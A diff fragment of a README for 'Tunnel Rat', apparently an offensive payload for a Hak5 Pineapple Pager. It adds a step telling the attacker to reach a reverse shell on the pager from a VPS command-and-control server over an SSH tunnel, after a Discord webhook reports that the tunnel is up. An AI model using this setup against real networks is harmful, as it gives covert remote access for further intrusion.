@@ -69,6 +69,8 @@ Tunnel Rat is a [Hak5 Pineapple Pager](https://shop.hak5.org/products/pager) pay
 **13)** If successful, the pager notifies the attacker via aforementioned Discord webhook that the tunnel is online.
   
 <img width="772" height="50" alt="hook2" src="https://github.com/user-attachments/assets/fefd4c95-fccf-45d4-be3c-0011599dd34a" />
+
+**14)** A reverse shell on the pager is then accessed inside of the VPS C2 via: `ssh -p 2222 root@127.0.0.1`
   
 **The attacker now has full remote access to the pager via a reverse shell `SSH` tunnel, allowing further exploitation of the target network.**
 
